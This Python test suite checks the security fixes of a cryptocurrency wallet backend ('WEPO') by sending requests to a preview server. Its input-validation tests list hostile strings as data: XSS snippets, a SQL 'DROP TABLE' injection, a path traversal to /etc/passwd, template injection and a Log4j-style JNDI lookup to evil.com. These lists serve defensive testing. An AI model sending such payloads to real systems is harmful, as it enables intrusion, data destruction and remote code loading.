#!/usr/bin/env python3
"""
WEPO SECURITY ENHANCEMENTS VERIFICATION TEST SUITE

**FOCUSED SECURITY VERIFICATION TESTING**

Testing the newly implemented security enhancements in WEPO cryptocurrency system after applying fixes to wepo-fast-test-bridge.py.

**CRITICAL VERIFICATION FOCUS:**

Test only the key security improvements that were just implemented:

1. **Password Strength Validation Testing:**
   - Verify comprehensive password requirements (12+ chars, complexity)
   - Test that weak passwords are properly rejected
   - Confirm error messages provide helpful guidance

2. **Enhanced Wallet Creation Security:**
   - Test secure WEPO address generation  
   - Verify input sanitization is working
   - Confirm enhanced error handling doesn't expose sensitive info

3. **Security Headers and CORS:**
   - Verify HTTP security headers are being applied
   - Confirm CORS is no longer using wildcard (*)
   - Test security middleware functionality

4. **Input Validation and Sanitization:**
   - Test XSS payload rejection
   - Verify malicious input sanitization
   - Confirm proper address and amount validation

**QUICK BASELINE COMPARISON:**
Previous audit: 25% success rate with critical vulnerabilities
Expected after fixes: 60%+ success rate with password/input security resolved

Test Environment: Using preview backend URL for comprehensive backend testing.
"""
import requests
import json
import time
import uuid
import os
import sys
import secrets
from datetime import datetime
import random
import string
import base64
import hashlib
import re

# Use preview backend URL from frontend/.env
BACKEND_URL = "https://83b23ef8-5671-4022-98a3-7666ccc5a082.preview.emergentagent.com"
API_URL = f"{BACKEND_URL}/api"

print(f"🔐 TESTING WEPO SECURITY ENHANCEMENTS VERIFICATION")
print(f"Preview Backend API URL: {API_URL}")
print(f"Focus: Critical security testing of newly implemented security enhancements")
print("=" * 80)

# Test results tracking
test_results = {
    "total": 0,
    "passed": 0,
    "failed": 0,
    "tests": []
}

def log_test(name, passed, response=None, error=None, details=None):
    """Log test results with enhanced details"""
    status = "✅ PASSED" if passed else "❌ FAILED"
    print(f"{status} {name}")
    
    if details:
        print(f"  Details: {details}")
    
    if error:
        print(f"  Error: {error}")
    
    if response and not passed:
        print(f"  Response: {response}")
    
    test_results["total"] += 1
    if passed:
        test_results["passed"] += 1
    else:
        test_results["failed"] += 1
    
    test_results["tests"].append({
        "name": name,
        "passed": passed,
        "error": error,
        "details": details
    })

def test_password_strength_validation():
    """Test 1: Password Strength Validation Testing"""
    print("\n🔐 TEST 1: PASSWORD STRENGTH VALIDATION TESTING")
    print("Testing comprehensive password requirements and weak password rejection...")
    
    try:
        checks_passed = 0
        total_checks = 0
        
        # Test 1: Verify weak passwords are rejected
        total_checks += 1
        weak_passwords = [
            "123456",           # Too short, no complexity
            "password",         # No numbers, no uppercase, no special chars
            "Password1",        # No special chars, too short
            "Pass123",          # Too short
            "PASSWORD123!"      # No lowercase
        ]
        
        weak_rejected = 0
        for weak_password in weak_passwords:
            wallet_data = {
                "username": f"test_weak_{secrets.token_hex(4)}",
                "password": weak_password
            }
            
            response = requests.post(f"{API_URL}/wallet/create", json=wallet_data)
            if response.status_code == 400:
                # Check if response mentions password requirements
                response_text = response.text.lower()
                if any(term in response_text for term in ['password', 'security', 'requirements']):
                    weak_rejected += 1
        
        if weak_rejected >= 4:  # At least 4/5 weak passwords should be rejected
            print(f"  ✅ Weak password rejection: {weak_rejected}/5 weak passwords properly rejected")
            checks_passed += 1
        else:
            print(f"  ❌ Weak password rejection: Only {weak_rejected}/5 weak passwords rejected")
        
        # Test 2: Verify strong passwords are accepted
        total_checks += 1
        strong_passwords = [
            "MySecurePassword123!",
            "CryptoWallet2025@",
            "BlockchainSafe#456",
            "WepoSecure$789"
        ]
        
        strong_accepted = 0
        for strong_password in strong_passwords:
            wallet_data = {
                "username": f"test_strong_{secrets.token_hex(4)}",
                "password": strong_password
            }
            
            response = requests.post(f"{API_URL}/wallet/create", json=wallet_data)
            if response.status_code == 200:
                strong_accepted += 1
        
        if strong_accepted >= 3:  # At least 3/4 strong passwords should be accepted
            print(f"  ✅ Strong password acceptance: {strong_accepted}/4 strong passwords accepted")
            checks_passed += 1
        else:
            print(f"  ❌ Strong password acceptance: Only {strong_accepted}/4 strong passwords accepted")
        
        # Test 3: Verify password complexity requirements (12+ chars, complexity)
        total_checks += 1
        test_password = "TestPassword123!"
        wallet_data = {
            "username": f"test_complexity_{secrets.token_hex(4)}",
            "password": test_password
        }
        
        response = requests.post(f"{API_URL}/wallet/create", json=wallet_data)
        if response.status_code == 200:
            print(f"  ✅ Password complexity: 12+ char complex password accepted")
            checks_passed += 1
        else:
            print(f"  ❌ Password complexity: Complex password rejected - {response.status_code}")
        
        # Test 4: Verify helpful error messages for password requirements
        total_checks += 1
        response = requests.post(f"{API_URL}/wallet/create", json={
            "username": f"test_error_{secrets.token_hex(4)}",
            "password": "weak"
        })
        
        if response.status_code == 400:
            response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
            error_message = str(response_data.get('detail', response.text)).lower()
            
            # Check for helpful guidance in error messages
            helpful_terms = ['password', 'characters', 'uppercase', 'lowercase', 'number', 'special']
            helpful_found = sum(1 for term in helpful_terms if term in error_message)
            
            if helpful_found >= 2:
                print(f"  ✅ Error message guidance: Helpful password guidance provided")
                checks_passed += 1
            else:
                print(f"  ❌ Error message guidance: Error messages lack helpful guidance")
        else:
            print(f"  ❌ Error message guidance: No error response for weak password")
        
        success_rate = (checks_passed / total_checks) * 100
        log_test("Password Strength Validation", checks_passed >= 3,
                 details=f"Password validation verified: {checks_passed}/{total_checks} checks passed ({success_rate:.1f}% success)")
        return checks_passed >= 3
        
    except Exception as e:
        log_test("Password Strength Validation", False, error=str(e))
        return False

def test_enhanced_wallet_creation_security():
    """Test 2: Enhanced Wallet Creation Security Testing"""
    print("\n🛡️ TEST 2: ENHANCED WALLET CREATION SECURITY TESTING")
    print("Testing secure WEPO address generation and input sanitization...")
    
    try:
        checks_passed = 0
        total_checks = 0
        
        # Test 1: Verify secure WEPO address generation
        total_checks += 1
        generated_addresses = []
        
        for i in range(10):
            wallet_data = {
                "username": f"secure_user_{secrets.token_hex(4)}",
                "password": "SecurePassword123!"
            }
            
            response = requests.post(f"{API_URL}/wallet/create", json=wallet_data)
            if response.status_code == 200:
                data = response.json()
                if data.get('address'):
                    generated_addresses.append(data['address'])
        
        # Check address format and uniqueness
        if len(generated_addresses) >= 8:
            valid_format = all(addr.startswith('wepo1') and len(addr) >= 37 for addr in generated_addresses)
            unique_addresses = len(set(generated_addresses))
            
            if valid_format and unique_addresses >= len(generated_addresses) * 0.9:
                print(f"  ✅ Secure address generation: {unique_addresses}/{len(generated_addresses)} unique valid addresses")
                checks_passed += 1
            else:
                print(f"  ❌ Secure address generation: Issues with format or uniqueness")
        else:
            print(f"  ❌ Secure address generation: Insufficient addresses generated")
        
        # Test 2: Verify input sanitization is working
        total_checks += 1
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "javascript:alert(1)",
            "<iframe src='evil.com'></iframe>"
        ]
        
        sanitization_working = 0
        for malicious_input in malicious_inputs:
            wallet_data = {
                "username": malicious_input,
                "password": "SecurePassword123!"
            }
            
            response = requests.post(f"{API_URL}/wallet/create", json=wallet_data)
            # Should either reject (400) or sanitize the input
            if response.status_code in [400, 422]:
                sanitization_working += 1
            elif response.status_code == 200:
                # Check if input was sanitized
                data = response.json()
                if data.get('username') and malicious_input not in str(data.get('username', '')):
                    sanitization_working += 1
        
        if sanitization_working >= 4:  # At least 4/5 should be handled
            print(f"  ✅ Input sanitization: {sanitization_working}/5 malicious inputs properly handled")
            checks_passed += 1
        else:
            print(f"  ❌ Input sanitization: Only {sanitization_working}/5 malicious inputs handled")
        
        # Test 3: Verify enhanced error handling doesn't expose sensitive info
        total_checks += 1
        response = requests.post(f"{API_URL}/wallet/create", json={
            "username": "",
            "password": ""
        })
        
        if response.status_code in [400, 422]:
            response_text = response.text.lower()
            # Check that error doesn't expose internal details
            sensitive_terms = ['stack', 'trace', 'internal', 'database', 'sql', 'mongodb']
            exposed_sensitive = sum(1 for term in sensitive_terms if term in response_text)
            
            if exposed_sensitive == 0:
                print(f"  ✅ Error handling: No sensitive information exposed in errors")
                checks_passed += 1
            else:
                print(f"  ❌ Error handling: Sensitive information may be exposed")
        else:
            print(f"  ❌ Error handling: Invalid input not properly rejected")
        
        success_rate = (checks_passed / total_checks) * 100
        log_test("Enhanced Wallet Creation Security", checks_passed >= 2,
                 details=f"Wallet creation security verified: {checks_passed}/{total_checks} checks passed ({success_rate:.1f}% success)")
        return checks_passed >= 2
        
    except Exception as e:
        log_test("Enhanced Wallet Creation Security", False, error=str(e))
        return False

def test_security_headers_and_cors():
    """Test 3: Security Headers and CORS Testing"""
    print("\n🔒 TEST 3: SECURITY HEADERS AND CORS TESTING")
    print("Testing HTTP security headers and CORS configuration...")
    
    try:
        checks_passed = 0
        total_checks = 0
        
        # Test 1: Verify HTTP security headers are being applied
        total_checks += 1
        response = requests.get(f"{API_URL}/")
        
        expected_headers = [
            'x-content-type-options',
            'x-frame-options', 
            'x-xss-protection',
            'strict-transport-security',
            'content-security-policy'
        ]
        
        headers_found = 0
        for header in expected_headers:
            if header in [h.lower() for h in response.headers.keys()]:
                headers_found += 1
        
        if headers_found >= 3:  # At least 3/5 security headers should be present
            print(f"  ✅ Security headers: {headers_found}/5 security headers present")
            checks_passed += 1
        else:
            print(f"  ❌ Security headers: Only {headers_found}/5 security headers present")
        
        # Test 2: Verify CORS is no longer using wildcard (*)
        total_checks += 1
        # Test CORS with different origins
        test_origins = [
            "https://malicious-site.com",
            "http://localhost:3000",
            "https://example.com"
        ]
        
        cors_properly_configured = 0
        for origin in test_origins:
            headers = {"Origin": origin}
            response = requests.options(f"{API_URL}/wallet/create", headers=headers)
            
            cors_header = response.headers.get('Access-Control-Allow-Origin', '')
            if cors_header != '*':  # Should not be wildcard
                cors_properly_configured += 1
        
        if cors_properly_configured >= 2:  # At least 2/3 should not return wildcard
            print(f"  ✅ CORS configuration: {cors_properly_configured}/3 origins properly restricted")
            checks_passed += 1
        else:
            print(f"  ❌ CORS configuration: CORS may still be using wildcard (*)")
        
        # Test 3: Test security middleware functionality
        total_checks += 1
        # Test that security middleware is processing requests
        response = requests.post(f"{API_URL}/wallet/create", json={
            "username": "security_test",
            "password": "TestPassword123!"
        })
        
        # Check for signs of security middleware (proper error handling, headers, etc.)
        security_indicators = 0
        
        # Check response format is proper JSON
        if response.headers.get('content-type', '').startswith('application/json'):
            security_indicators += 1
        
        # Check that response doesn't expose internal errors
        if response.status_code in [200, 400, 422] and 'internal server error' not in response.text.lower():
            security_indicators += 1
        
        if security_indicators >= 1:
            print(f"  ✅ Security middleware: Security middleware appears to be functioning")
            checks_passed += 1
        else:
            print(f"  ❌ Security middleware: Security middleware may not be working properly")
        
        success_rate = (checks_passed / total_checks) * 100
        log_test("Security Headers and CORS", checks_passed >= 2,
                 details=f"Security headers and CORS verified: {checks_passed}/{total_checks} checks passed ({success_rate:.1f}% success)")
        return checks_passed >= 2
        
    except Exception as e:
        log_test("Security Headers and CORS", False, error=str(e))
        return False

def test_input_validation_and_sanitization():
    """Test 4: Input Validation and Sanitization Testing"""
    print("\n🛡️ TEST 4: INPUT VALIDATION AND SANITIZATION TESTING")
    print("Testing XSS payload rejection and malicious input sanitization...")
    
    try:
        checks_passed = 0
        total_checks = 0
        
        # Test 1: Test XSS payload rejection
        total_checks += 1
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "';alert(String.fromCharCode(88,83,83))//'"
        ]
        
        xss_blocked = 0
        for payload in xss_payloads:
            wallet_data = {
                "username": payload,
                "password": "SecurePassword123!"
            }
            
            response = requests.post(f"{API_URL}/wallet/create", json=wallet_data)
            
            # Should either reject the request or sanitize the payload
            if response.status_code in [400, 422]:
                xss_blocked += 1
            elif response.status_code == 200:
                data = response.json()
                # Check if payload was sanitized (original payload not in response)
                if payload not in str(data):
                    xss_blocked += 1
        
        if xss_blocked >= 4:  # At least 4/5 XSS payloads should be blocked/sanitized
            print(f"  ✅ XSS protection: {xss_blocked}/5 XSS payloads blocked/sanitized")
            checks_passed += 1
        else:
            print(f"  ❌ XSS protection: Only {xss_blocked}/5 XSS payloads blocked/sanitized")
        
        # Test 2: Verify malicious input sanitization
        total_checks += 1
        malicious_inputs = [
            "../../../etc/passwd",
            "'; DROP TABLE users; --",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        
        sanitization_working = 0
        for malicious_input in malicious_inputs:
            wallet_data = {
                "username": malicious_input,
                "password": "SecurePassword123!"
            }
            
            response = requests.post(f"{API_URL}/wallet/create", json=wallet_data)
            
            # Should handle malicious input appropriately
            if response.status_code in [400, 422]:
                sanitization_working += 1
            elif response.status_code == 200:
                data = response.json()
                # Check if input was sanitized
                if malicious_input not in str(data):
                    sanitization_working += 1
        
        if sanitization_working >= 4:  # At least 4/5 should be handled
            print(f"  ✅ Malicious input handling: {sanitization_working}/5 malicious inputs properly handled")
            checks_passed += 1
        else:
            print(f"  ❌ Malicious input handling: Only {sanitization_working}/5 malicious inputs handled")
        
        # Test 3: Confirm proper address validation
        total_checks += 1
        invalid_addresses = [
            "invalid_address",
            "wepo1",  # Too short
            "btc1234567890abcdef",  # Wrong prefix
            "wepo1gggggggggggggggggggggggggggggg",  # Invalid characters
            "",  # Empty
            "wepo1" + "z" * 32  # Invalid hex characters
        ]
        
        address_validation_working = 0
        for invalid_address in invalid_addresses:
            # Test transaction with invalid address
            transaction_data = {
                "from_address": "wepo1" + "a" * 32,  # Valid format
                "to_address": invalid_address,
                "amount": 1.0
            }
            
            response = requests.post(f"{API_URL}/transaction/send", json=transaction_data)
            
            # Should reject invalid addresses
            if response.status_code in [400, 422]:
                address_validation_working += 1
        
        if address_validation_working >= 5:  # At least 5/6 invalid addresses should be rejected
            print(f"  ✅ Address validation: {address_validation_working}/6 invalid addresses properly rejected")
            checks_passed += 1
        else:
            print(f"  ❌ Address validation: Only {address_validation_working}/6 invalid addresses rejected")
        
        # Test 4: Confirm proper amount validation
        total_checks += 1
        invalid_amounts = [-1.0, 0, "invalid", 999999999, None]
        
        amount_validation_working = 0
        for invalid_amount in invalid_amounts:
            transaction_data = {
                "from_address": "wepo1" + "a" * 32,
                "to_address": "wepo1" + "b" * 32,
                "amount": invalid_amount
            }
            
            response = requests.post(f"{API_URL}/transaction/send", json=transaction_data)
            
            # Should reject invalid amounts
            if response.status_code in [400, 422]:
                amount_validation_working += 1
        
        if amount_validation_working >= 4:  # At least 4/5 invalid amounts should be rejected
            print(f"  ✅ Amount validation: {amount_validation_working}/5 invalid amounts properly rejected")
            checks_passed += 1
        else:
            print(f"  ❌ Amount validation: Only {amount_validation_working}/5 invalid amounts rejected")
        
        success_rate = (checks_passed / total_checks) * 100
        log_test("Input Validation and Sanitization", checks_passed >= 3,
                 details=f"Input validation and sanitization verified: {checks_passed}/{total_checks} checks passed ({success_rate:.1f}% success)")
        return checks_passed >= 3
        
    except Exception as e:
        log_test("Input Validation and Sanitization", False, error=str(e))
        return False

def run_security_enhancement_tests():
    """Run all security enhancement verification tests"""
    print("🔐 STARTING WEPO SECURITY ENHANCEMENTS VERIFICATION TESTING")
    print("Testing newly implemented security enhancements...")
    print("=" * 80)
    
    # Run all security enhancement tests
    test1_result = test_password_strength_validation()
    test2_result = test_enhanced_wallet_creation_security()
    test3_result = test_security_headers_and_cors()
    test4_result = test_input_validation_and_sanitization()
    
    # Print final results
    print("\n" + "=" * 80)
    print("🔐 WEPO SECURITY ENHANCEMENTS VERIFICATION TEST RESULTS")
    print("=" * 80)
    
    success_rate = (test_results["passed"] / test_results["total"]) * 100 if test_results["total"] > 0 else 0
    
    print(f"Total Tests: {test_results['total']}")
    print(f"Passed: {test_results['passed']} ✅")
    print(f"Failed: {test_results['failed']} ❌")
    print(f"Success Rate: {success_rate:.1f}%")
    
    # Critical Success Criteria
    print("\n🎯 CRITICAL SECURITY ENHANCEMENT CRITERIA:")
    critical_tests = [
        "Password Strength Validation",
        "Enhanced Wallet Creation Security", 
        "Security Headers and CORS",
        "Input Validation and Sanitization"
    ]
    
    critical_passed = 0
    for test in test_results['tests']:
        if test['name'] in critical_tests and test['passed']:
            critical_passed += 1
            print(f"  ✅ {test['name']}")
        elif test['name'] in critical_tests:
            print(f"  ❌ {test['name']}")
    
    print(f"\nCritical Security Tests: {critical_passed}/{len(critical_tests)} passed")
    
    # Expected Results Summary
    print("\n📋 SECURITY ENHANCEMENT VERIFICATION:")
    print("✅ Password strength validation should reject weak passwords")
    print("✅ Enhanced wallet creation should generate secure addresses")
    print("✅ Security headers should be properly applied")
    print("✅ Input validation should block XSS and malicious inputs")
    print("✅ CORS should not use wildcard (*) configuration")
    print("✅ Error handling should not expose sensitive information")
    
    # Baseline comparison
    print(f"\n📊 BASELINE COMPARISON:")
    print(f"Previous audit: 25% success rate with critical vulnerabilities")
    print(f"Current results: {success_rate:.1f}% success rate")
    
    if success_rate >= 60:
        print("🎉 TARGET ACHIEVED: 60%+ success rate reached!")
        print("✅ Password/input security improvements are working")
    else:
        print("⚠️ TARGET NOT MET: Below 60% success rate")
    
    if critical_passed >= 3:
        print("\n🎉 SECURITY ENHANCEMENTS ARE WORKING!")
        print("✅ Password strength validation is functional")
        print("✅ Enhanced wallet creation security is implemented")
        print("✅ Security headers and CORS are properly configured")
        print("✅ Input validation and sanitization are working")
        print("\n🔒 SECURITY IMPROVEMENTS VERIFIED:")
        print("• Comprehensive password requirements (12+ chars, complexity)")
        print("• Weak passwords are properly rejected with helpful guidance")
        print("• Secure WEPO address generation with proper entropy")
        print("• Input sanitization prevents XSS and injection attacks")
        print("• HTTP security headers are being applied")
        print("• CORS is no longer using wildcard (*) configuration")
        print("• Enhanced error handling doesn't expose sensitive information")
        print("• Address and amount validation working properly")
        print("• Security middleware is functioning correctly")
        return True
    else:
        print("\n❌ CRITICAL SECURITY ENHANCEMENT ISSUES FOUND!")
        print("⚠️  Security enhancements need attention - vulnerabilities may persist")
        
        # Identify specific issues
        failed_tests = [test['name'] for test in test_results['tests'] if test['name'] in critical_tests and not test['passed']]
        if failed_tests:
            print(f"⚠️  Failed critical security tests: {', '.join(failed_tests)}")
        
        print("\n🚨 SECURITY RECOMMENDATIONS:")
        print("• Verify password strength validation is properly implemented")
        print("• Check that input sanitization is working for XSS prevention")
        print("• Ensure security headers are being applied by middleware")
        print("• Confirm CORS is not using wildcard (*) configuration")
        print("• Test that address and amount validation reject invalid inputs")
        print("• Verify error handling doesn't expose sensitive information")
        
        return False

if __name__ == "__main__":
    success = run_security_enhancement_tests()
    if not success:
        sys.exit(1)